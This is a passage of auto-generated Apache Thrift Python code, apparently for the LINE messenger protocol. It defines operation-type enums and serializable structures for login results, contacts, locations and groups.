        65: "NOTIFIED_DESTROY_MESSAGE",
        66: "UPDATE_PUBLICKEYCHAIN",
        67: "NOTIFIED_UPDATE_PUBLICKEYCHAIN",
        68: "NOTIFIED_BLOCK_CONTACT",
        69: "NOTIFIED_UNBLOCK_CONTACT",
        70: "UPDATE_GROUPPREFERENCE",
        71: "NOTIFIED_PAYMENT_EVENT",
        72: "REGISTER_E2EE_PUBLICKEY",
        73: "NOTIFIED_E2EE_KEY_EXCHANGE_REQ",
        74: "NOTIFIED_E2EE_KEY_EXCHANGE_RESP",
        75: "NOTIFIED_E2EE_MESSAGE_RESEND_REQ",
        76: "NOTIFIED_E2EE_MESSAGE_RESEND_RESP",
        77: "NOTIFIED_E2EE_KEY_UPDATE",
        78: "NOTIFIED_BUDDY_UPDATE_PROFILE",
        79: "NOTIFIED_UPDATE_LINEAT_TABS",
        80: "UPDATE_ROOM",
        81: "NOTIFIED_BEACON_DETECTED",
        82: "UPDATE_EXTENDED_PROFILE",
        83: "ADD_FOLLOW",
        84: "NOTIFIED_ADD_FOLLOW",
        85: "DELETE_FOLLOW",
        86: "NOTIFIED_DELETE_FOLLOW",
        87: "UPDATE_TIMELINE_SETTINGS",
        88: "NOTIFIED_FRIEND_REQUEST",
        89: "UPDATE_RINGBACK_TONE",
        90: "NOTIFIED_POSTBACK",
        91: "RECEIVE_READ_WATERMARK",
        92: "NOTIFIED_MESSAGE_DELIVERED",
        93: "NOTIFIED_UPDATE_CHAT_BAR",
        94: "NOTIFIED_CHATAPP_INSTALLED",
        95: "NOTIFIED_CHATAPP_UPDATED",
        96: "NOTIFIED_CHATAPP_NEW_MARK",
        97: "NOTIFIED_CHATAPP_DELETED",
        98: "NOTIFIED_CHATAPP_SYNC",
        99: "NOTIFIED_UPDATE_MESSAGE",
    }

    _NAMES_TO_VALUES = {
        "END_OF_OPERATION": 0,
        "UPDATE_PROFILE": 1,
        "UPDATE_SETTINGS": 36,
        "NOTIFIED_UPDATE_PROFILE": 2,
        "REGISTER_USERID": 3,
        "ADD_CONTACT": 4,
        "NOTIFIED_ADD_CONTACT": 5,
        "BLOCK_CONTACT": 6,
        "UNBLOCK_CONTACT": 7,
        "NOTIFIED_RECOMMEND_CONTACT": 8,
        "CREATE_GROUP": 9,
        "UPDATE_GROUP": 10,
        "NOTIFIED_UPDATE_GROUP": 11,
        "INVITE_INTO_GROUP": 12,
        "NOTIFIED_INVITE_INTO_GROUP": 13,
        "CANCEL_INVITATION_GROUP": 31,
        "NOTIFIED_CANCEL_INVITATION_GROUP": 32,
        "LEAVE_GROUP": 14,
        "NOTIFIED_LEAVE_GROUP": 15,
        "ACCEPT_GROUP_INVITATION": 16,
        "NOTIFIED_ACCEPT_GROUP_INVITATION": 17,
        "REJECT_GROUP_INVITATION": 34,
        "NOTIFIED_REJECT_GROUP_INVITATION": 35,
        "KICKOUT_FROM_GROUP": 18,
        "NOTIFIED_KICKOUT_FROM_GROUP": 19,
        "CREATE_ROOM": 20,
        "INVITE_INTO_ROOM": 21,
        "NOTIFIED_INVITE_INTO_ROOM": 22,
        "LEAVE_ROOM": 23,
        "NOTIFIED_LEAVE_ROOM": 24,
        "SEND_MESSAGE": 25,
        "RECEIVE_MESSAGE": 26,
        "SEND_MESSAGE_RECEIPT": 27,
        "RECEIVE_MESSAGE_RECEIPT": 28,
        "SEND_CONTENT_RECEIPT": 29,
        "SEND_CHAT_CHECKED": 40,
        "SEND_CHAT_REMOVED": 41,
        "RECEIVE_ANNOUNCEMENT": 30,
        "INVITE_VIA_EMAIL": 38,
        "NOTIFIED_REGISTER_USER": 37,
        "NOTIFIED_UNREGISTER_USER": 33,
        "NOTIFIED_REQUEST_RECOVERY": 39,
        "NOTIFIED_FORCE_SYNC": 42,
        "SEND_CONTENT": 43,
        "SEND_MESSAGE_MYHOME": 44,
        "NOTIFIED_UPDATE_CONTENT_PREVIEW": 45,
        "REMOVE_ALL_MESSAGES": 46,
        "NOTIFIED_UPDATE_PURCHASES": 47,
        "DUMMY": 48,
        "UPDATE_CONTACT": 49,
        "NOTIFIED_RECEIVED_CALL": 50,
        "CANCEL_CALL": 51,
        "NOTIFIED_REDIRECT": 52,
        "NOTIFIED_CHANNEL_SYNC": 53,
        "FAILED_SEND_MESSAGE": 54,
        "NOTIFIED_READ_MESSAGE": 55,
        "FAILED_EMAIL_CONFIRMATION": 56,
        "NOTIFIED_PUSH_NOTICENTER_ITEM": 59,
        "NOTIFIED_CHAT_CONTENT": 58,
        "NOTIFIED_JOIN_CHAT": 60,
        "NOTIFIED_LEAVE_CHAT": 61,
        "NOTIFIED_TYPING": 62,
        "FRIEND_REQUEST_ACCEPTED": 63,
        "DESTROY_MESSAGE": 64,
        "NOTIFIED_DESTROY_MESSAGE": 65,
        "UPDATE_PUBLICKEYCHAIN": 66,
        "NOTIFIED_UPDATE_PUBLICKEYCHAIN": 67,
        "NOTIFIED_BLOCK_CONTACT": 68,
        "NOTIFIED_UNBLOCK_CONTACT": 69,
        "UPDATE_GROUPPREFERENCE": 70,
        "NOTIFIED_PAYMENT_EVENT": 71,
        "REGISTER_E2EE_PUBLICKEY": 72,
        "NOTIFIED_E2EE_KEY_EXCHANGE_REQ": 73,
        "NOTIFIED_E2EE_KEY_EXCHANGE_RESP": 74,
        "NOTIFIED_E2EE_MESSAGE_RESEND_REQ": 75,
        "NOTIFIED_E2EE_MESSAGE_RESEND_RESP": 76,
        "NOTIFIED_E2EE_KEY_UPDATE": 77,
        "NOTIFIED_BUDDY_UPDATE_PROFILE": 78,
        "NOTIFIED_UPDATE_LINEAT_TABS": 79,
        "UPDATE_ROOM": 80,
        "NOTIFIED_BEACON_DETECTED": 81,
        "UPDATE_EXTENDED_PROFILE": 82,
        "ADD_FOLLOW": 83,
        "NOTIFIED_ADD_FOLLOW": 84,
        "DELETE_FOLLOW": 85,
        "NOTIFIED_DELETE_FOLLOW": 86,
        "UPDATE_TIMELINE_SETTINGS": 87,
        "NOTIFIED_FRIEND_REQUEST": 88,
        "UPDATE_RINGBACK_TONE": 89,
        "NOTIFIED_POSTBACK": 90,
        "RECEIVE_READ_WATERMARK": 91,
        "NOTIFIED_MESSAGE_DELIVERED": 92,
        "NOTIFIED_UPDATE_CHAT_BAR": 93,
        "NOTIFIED_CHATAPP_INSTALLED": 94,
        "NOTIFIED_CHATAPP_UPDATED": 95,
        "NOTIFIED_CHATAPP_NEW_MARK": 96,
        "NOTIFIED_CHATAPP_DELETED": 97,
        "NOTIFIED_CHATAPP_SYNC": 98,
        "NOTIFIED_UPDATE_MESSAGE": 99,
    }


class ContactStatus(object):
    UNSPECIFIED = 0
    FRIEND = 1
    FRIEND_BLOCKED = 2
    RECOMMEND = 3
    RECOMMEND_BLOCKED = 4
    DELETED = 5
    DELETED_BLOCKED = 6

    _VALUES_TO_NAMES = {
        0: "UNSPECIFIED",
        1: "FRIEND",
        2: "FRIEND_BLOCKED",
        3: "RECOMMEND",
        4: "RECOMMEND_BLOCKED",
        5: "DELETED",
        6: "DELETED_BLOCKED",
    }

    _NAMES_TO_VALUES = {
        "UNSPECIFIED": 0,
        "FRIEND": 1,
        "FRIEND_BLOCKED": 2,
        "RECOMMEND": 3,
        "RECOMMEND_BLOCKED": 4,
        "DELETED": 5,
        "DELETED_BLOCKED": 6,
    }


class ContactRelation(object):
    ONEWAY = 0
    BOTH = 1
    NOT_REGISTERED = 2

    _VALUES_TO_NAMES = {
        0: "ONEWAY",
        1: "BOTH",
        2: "NOT_REGISTERED",
    }

    _NAMES_TO_VALUES = {
        "ONEWAY": 0,
        "BOTH": 1,
        "NOT_REGISTERED": 2,
    }


class LoginResult(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'authToken', 'UTF8', None, ),  # 1
        (2, TType.STRING, 'certificate', 'UTF8', None, ),  # 2
        (3, TType.STRING, 'verifier', 'UTF8', None, ),  # 3
        (4, TType.STRING, 'pinCode', 'UTF8', None, ),  # 4
        (5, TType.I32, 'type', None, None, ),  # 5
    )

    def __init__(self, authToken=None, certificate=None, verifier=None, pinCode=None, type=None,):
        self.authToken = authToken
        self.certificate = certificate
        self.verifier = verifier
        self.pinCode = pinCode
        self.type = type

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.authToken = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.certificate = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.verifier = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.pinCode = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.I32:
                    self.type = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LoginResult')
        if self.authToken is not None:
            oprot.writeFieldBegin('authToken', TType.STRING, 1)
            oprot.writeString(self.authToken.encode('utf-8') if sys.version_info[0] == 2 else self.authToken)
            oprot.writeFieldEnd()
        if self.certificate is not None:
            oprot.writeFieldBegin('certificate', TType.STRING, 2)
            oprot.writeString(self.certificate.encode('utf-8') if sys.version_info[0] == 2 else self.certificate)
            oprot.writeFieldEnd()
        if self.verifier is not None:
            oprot.writeFieldBegin('verifier', TType.STRING, 3)
            oprot.writeString(self.verifier.encode('utf-8') if sys.version_info[0] == 2 else self.verifier)
            oprot.writeFieldEnd()
        if self.pinCode is not None:
            oprot.writeFieldBegin('pinCode', TType.STRING, 4)
            oprot.writeString(self.pinCode.encode('utf-8') if sys.version_info[0] == 2 else self.pinCode)
            oprot.writeFieldEnd()
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.I32, 5)
            oprot.writeI32(self.type)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class Contact(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'mid', 'UTF8', None, ),  # 1
        (2, TType.I64, 'createdTime', None, None, ),  # 2
        None,  # 3
        None,  # 4
        None,  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.I32, 'type', None, None, ),  # 10
        (11, TType.I32, 'status', None, None, ),  # 11
        None,  # 12
        None,  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        None,  # 20
        (21, TType.I32, 'relation', None, None, ),  # 21
        (22, TType.STRING, 'displayName', 'UTF8', None, ),  # 22
        (23, TType.STRING, 'phoneticName', 'UTF8', None, ),  # 23
        (24, TType.STRING, 'pictureStatus', 'UTF8', None, ),  # 24
        (25, TType.STRING, 'thumbnailUrl', 'UTF8', None, ),  # 25
        (26, TType.STRING, 'statusMessage', 'UTF8', None, ),  # 26
        (27, TType.STRING, 'displayNameOverridden', 'UTF8', None, ),  # 27
        (28, TType.I64, 'favoriteTime', None, None, ),  # 28
        None,  # 29
        None,  # 30
        (31, TType.BOOL, 'capableVoiceCall', None, None, ),  # 31
        (32, TType.BOOL, 'capableVideoCall', None, None, ),  # 32
        (33, TType.BOOL, 'capableMyhome', None, None, ),  # 33
        (34, TType.BOOL, 'capableBuddy', None, None, ),  # 34
        (35, TType.I32, 'attributes', None, None, ),  # 35
        (36, TType.I64, 'settings', None, None, ),  # 36
        (37, TType.STRING, 'picturePath', 'UTF8', None, ),  # 37
        (38, TType.STRING, 'recommendParams', 'UTF8', None, ),  # 38
        (39, TType.I32, 'friendRequestStatus', None, None, ),  # 39
        (40, TType.STRING, 'musicProfile', 'UTF8', None, ),  # 40
        None,  # 41
        (42, TType.STRING, 'videoProfile', 'UTF8', None, ),  # 42
    )

    def __init__(self, mid=None, createdTime=None, type=None, status=None, relation=None, displayName=None, phoneticName=None, pictureStatus=None, thumbnailUrl=None, statusMessage=None, displayNameOverridden=None, favoriteTime=None, capableVoiceCall=None, capableVideoCall=None, capableMyhome=None, capableBuddy=None, attributes=None, settings=None, picturePath=None, recommendParams=None, friendRequestStatus=None, musicProfile=None, videoProfile=None,):
        self.mid = mid
        self.createdTime = createdTime
        self.type = type
        self.status = status
        self.relation = relation
        self.displayName = displayName
        self.phoneticName = phoneticName
        self.pictureStatus = pictureStatus
        self.thumbnailUrl = thumbnailUrl
        self.statusMessage = statusMessage
        self.displayNameOverridden = displayNameOverridden
        self.favoriteTime = favoriteTime
        self.capableVoiceCall = capableVoiceCall
        self.capableVideoCall = capableVideoCall
        self.capableMyhome = capableMyhome
        self.capableBuddy = capableBuddy
        self.attributes = attributes
        self.settings = settings
        self.picturePath = picturePath
        self.recommendParams = recommendParams
        self.friendRequestStatus = friendRequestStatus
        self.musicProfile = musicProfile
        self.videoProfile = videoProfile

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.mid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I64:
                    self.createdTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.I32:
                    self.type = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.I32:
                    self.status = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 21:
                if ftype == TType.I32:
                    self.relation = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 22:
                if ftype == TType.STRING:
                    self.displayName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 23:
                if ftype == TType.STRING:
                    self.phoneticName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 24:
                if ftype == TType.STRING:
                    self.pictureStatus = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 25:
                if ftype == TType.STRING:
                    self.thumbnailUrl = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 26:
                if ftype == TType.STRING:
                    self.statusMessage = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 27:
                if ftype == TType.STRING:
                    self.displayNameOverridden = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 28:
                if ftype == TType.I64:
                    self.favoriteTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 31:
                if ftype == TType.BOOL:
                    self.capableVoiceCall = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 32:
                if ftype == TType.BOOL:
                    self.capableVideoCall = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 33:
                if ftype == TType.BOOL:
                    self.capableMyhome = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 34:
                if ftype == TType.BOOL:
                    self.capableBuddy = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 35:
                if ftype == TType.I32:
                    self.attributes = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 36:
                if ftype == TType.I64:
                    self.settings = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 37:
                if ftype == TType.STRING:
                    self.picturePath = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 38:
                if ftype == TType.STRING:
                    self.recommendParams = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 39:
                if ftype == TType.I32:
                    self.friendRequestStatus = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 40:
                if ftype == TType.STRING:
                    self.musicProfile = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 42:
                if ftype == TType.STRING:
                    self.videoProfile = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Contact')
        if self.mid is not None:
            oprot.writeFieldBegin('mid', TType.STRING, 1)
            oprot.writeString(self.mid.encode('utf-8') if sys.version_info[0] == 2 else self.mid)
            oprot.writeFieldEnd()
        if self.createdTime is not None:
            oprot.writeFieldBegin('createdTime', TType.I64, 2)
            oprot.writeI64(self.createdTime)
            oprot.writeFieldEnd()
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.I32, 10)
            oprot.writeI32(self.type)
            oprot.writeFieldEnd()
        if self.status is not None:
            oprot.writeFieldBegin('status', TType.I32, 11)
            oprot.writeI32(self.status)
            oprot.writeFieldEnd()
        if self.relation is not None:
            oprot.writeFieldBegin('relation', TType.I32, 21)
            oprot.writeI32(self.relation)
            oprot.writeFieldEnd()
        if self.displayName is not None:
            oprot.writeFieldBegin('displayName', TType.STRING, 22)
            oprot.writeString(self.displayName.encode('utf-8') if sys.version_info[0] == 2 else self.displayName)
            oprot.writeFieldEnd()
        if self.phoneticName is not None:
            oprot.writeFieldBegin('phoneticName', TType.STRING, 23)
            oprot.writeString(self.phoneticName.encode('utf-8') if sys.version_info[0] == 2 else self.phoneticName)
            oprot.writeFieldEnd()
        if self.pictureStatus is not None:
            oprot.writeFieldBegin('pictureStatus', TType.STRING, 24)
            oprot.writeString(self.pictureStatus.encode('utf-8') if sys.version_info[0] == 2 else self.pictureStatus)
            oprot.writeFieldEnd()
        if self.thumbnailUrl is not None:
            oprot.writeFieldBegin('thumbnailUrl', TType.STRING, 25)
            oprot.writeString(self.thumbnailUrl.encode('utf-8') if sys.version_info[0] == 2 else self.thumbnailUrl)
            oprot.writeFieldEnd()
        if self.statusMessage is not None:
            oprot.writeFieldBegin('statusMessage', TType.STRING, 26)
            oprot.writeString(self.statusMessage.encode('utf-8') if sys.version_info[0] == 2 else self.statusMessage)
            oprot.writeFieldEnd()
        if self.displayNameOverridden is not None:
            oprot.writeFieldBegin('displayNameOverridden', TType.STRING, 27)
            oprot.writeString(self.displayNameOverridden.encode('utf-8') if sys.version_info[0] == 2 else self.displayNameOverridden)
            oprot.writeFieldEnd()
        if self.favoriteTime is not None:
            oprot.writeFieldBegin('favoriteTime', TType.I64, 28)
            oprot.writeI64(self.favoriteTime)
            oprot.writeFieldEnd()
        if self.capableVoiceCall is not None:
            oprot.writeFieldBegin('capableVoiceCall', TType.BOOL, 31)
            oprot.writeBool(self.capableVoiceCall)
            oprot.writeFieldEnd()
        if self.capableVideoCall is not None:
            oprot.writeFieldBegin('capableVideoCall', TType.BOOL, 32)
            oprot.writeBool(self.capableVideoCall)
            oprot.writeFieldEnd()
        if self.capableMyhome is not None:
            oprot.writeFieldBegin('capableMyhome', TType.BOOL, 33)
            oprot.writeBool(self.capableMyhome)
            oprot.writeFieldEnd()
        if self.capableBuddy is not None:
            oprot.writeFieldBegin('capableBuddy', TType.BOOL, 34)
            oprot.writeBool(self.capableBuddy)
            oprot.writeFieldEnd()
        if self.attributes is not None:
            oprot.writeFieldBegin('attributes', TType.I32, 35)
            oprot.writeI32(self.attributes)
            oprot.writeFieldEnd()
        if self.settings is not None:
            oprot.writeFieldBegin('settings', TType.I64, 36)
            oprot.writeI64(self.settings)
            oprot.writeFieldEnd()
        if self.picturePath is not None:
            oprot.writeFieldBegin('picturePath', TType.STRING, 37)
            oprot.writeString(self.picturePath.encode('utf-8') if sys.version_info[0] == 2 else self.picturePath)
            oprot.writeFieldEnd()
        if self.recommendParams is not None:
            oprot.writeFieldBegin('recommendParams', TType.STRING, 38)
            oprot.writeString(self.recommendParams.encode('utf-8') if sys.version_info[0] == 2 else self.recommendParams)
            oprot.writeFieldEnd()
        if self.friendRequestStatus is not None:
            oprot.writeFieldBegin('friendRequestStatus', TType.I32, 39)
            oprot.writeI32(self.friendRequestStatus)
            oprot.writeFieldEnd()
        if self.musicProfile is not None:
            oprot.writeFieldBegin('musicProfile', TType.STRING, 40)
            oprot.writeString(self.musicProfile.encode('utf-8') if sys.version_info[0] == 2 else self.musicProfile)
            oprot.writeFieldEnd()
        if self.videoProfile is not None:
            oprot.writeFieldBegin('videoProfile', TType.STRING, 42)
            oprot.writeString(self.videoProfile.encode('utf-8') if sys.version_info[0] == 2 else self.videoProfile)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class Location(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'title', 'UTF8', None, ),  # 1
        (2, TType.STRING, 'address', 'UTF8', None, ),  # 2
        (3, TType.DOUBLE, 'latitude', None, None, ),  # 3
        (4, TType.DOUBLE, 'longitude', None, None, ),  # 4
        (5, TType.STRING, 'phone', 'UTF8', None, ),  # 5
    )

    def __init__(self, title=None, address=None, latitude=None, longitude=None, phone=None,):
        self.title = title
        self.address = address
        self.latitude = latitude
        self.longitude = longitude
        self.phone = phone

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.title = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.address = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.DOUBLE:
                    self.latitude = iprot.readDouble()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.DOUBLE:
                    self.longitude = iprot.readDouble()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.STRING:
                    self.phone = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Location')
        if self.title is not None:
            oprot.writeFieldBegin('title', TType.STRING, 1)
            oprot.writeString(self.title.encode('utf-8') if sys.version_info[0] == 2 else self.title)
            oprot.writeFieldEnd()
        if self.address is not None:
            oprot.writeFieldBegin('address', TType.STRING, 2)
            oprot.writeString(self.address.encode('utf-8') if sys.version_info[0] == 2 else self.address)
            oprot.writeFieldEnd()
        if self.latitude is not None:
            oprot.writeFieldBegin('latitude', TType.DOUBLE, 3)
            oprot.writeDouble(self.latitude)
            oprot.writeFieldEnd()
        if self.longitude is not None:
            oprot.writeFieldBegin('longitude', TType.DOUBLE, 4)
            oprot.writeDouble(self.longitude)
            oprot.writeFieldEnd()
        if self.phone is not None:
            oprot.writeFieldBegin('phone', TType.STRING, 5)
            oprot.writeString(self.phone.encode('utf-8') if sys.version_info[0] == 2 else self.phone)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class GroupPreference(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'invitationTicket', 'UTF8', None, ),  # 1
        (2, TType.I64, 'favoriteTimestamp', None, None, ),  # 2
    )

    def __init__(self, invitationTicket=None, favoriteTimestamp=None,):
        self.invitationTicket = invitationTicket
        self.favoriteTimestamp = favoriteTimestamp

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.invitationTicket = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I64:
                    self.favoriteTimestamp = iprot.readI64()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('GroupPreference')
        if self.invitationTicket is not None:
            oprot.writeFieldBegin('invitationTicket', TType.STRING, 1)
            oprot.writeString(self.invitationTicket.encode('utf-8') if sys.version_info[0] == 2 else self.invitationTicket)
            oprot.writeFieldEnd()
        if self.favoriteTimestamp is not None:
            oprot.writeFieldBegin('favoriteTimestamp', TType.I64, 2)
            oprot.writeI64(self.favoriteTimestamp)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class Group(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'id', 'UTF8', None, ),  # 1
        (2, TType.I64, 'createdTime', None, None, ),  # 2
        None,  # 3
        None,  # 4
        None,  # 5
        None,  # 6
        None,  # 7
        None,  # 8
        None,  # 9
        (10, TType.STRING, 'name', 'UTF8', None, ),  # 10
        (11, TType.STRING, 'pictureStatus', 'UTF8', None, ),  # 11
        (12, TType.BOOL, 'preventedJoinByTicket', None, None, ),  # 12
        (13, TType.STRUCT, 'groupPreference', [GroupPreference, None], None, ),  # 13
        None,  # 14
        None,  # 15
        None,  # 16
        None,  # 17
        None,  # 18
        None,  # 19
        (20, TType.LIST, 'members', (TType.STRUCT, [Contact, None], False), None, ),  # 20
        (21, TType.STRUCT, 'creator', [Contact, None], None, ),  # 21
        (22, TType.LIST, 'invitee', (TType.STRUCT, [Contact, None], False), None, ),  # 22
        None,  # 23
        None,  # 24
        None,  # 25
        None,  # 26
        None,  # 27
        None,  # 28
        None,  # 29
        None,  # 30
        (31, TType.BOOL, 'notificationDisabled', None, None, ),  # 31
    )

    def __init__(self, id=None, createdTime=None, name=None, pictureStatus=None, preventedJoinByTicket=None, groupPreference=None, members=None, creator=None, invitee=[], notificationDisabled=None,):
        self.id = id
        self.createdTime = createdTime
        self.name = name
        self.pictureStatus = pictureStatus
        self.preventedJoinByTicket = preventedJoinByTicket
        self.groupPreference = groupPreference
        self.members = members
        self.creator = creator
        self.invitee = invitee
        self.notificationDisabled = notificationDisabled

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.id = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I64:
                    self.createdTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRING:
                    self.name = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.STRING:
                    self.pictureStatus = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 12:
                if ftype == TType.BOOL:
                    self.preventedJoinByTicket = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 13:
                if ftype == TType.STRUCT:
                    self.groupPreference = GroupPreference()
                    self.groupPreference.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 20:
                if ftype == TType.LIST:
                    self.members = []
                    (_etype3, _size0) = iprot.readListBegin()
                    for _i4 in range(_size0):
                        _elem5 = Contact()
                        _elem5.read(iprot)
                        self.members.append(_elem5)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 21:
                if ftype == TType.STRUCT:
                    self.creator = Contact()
                    self.creator.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 22:
                if ftype == TType.LIST:
                    self.invitee = []
                    (_etype9, _size6) = iprot.readListBegin()
                    for _i10 in range(_size6):
                        _elem11 = Contact()
                        _elem11.read(iprot)
                        self.invitee.append(_elem11)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 31:
                if ftype == TType.BOOL:
                    self.notificationDisabled = iprot.readBool()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

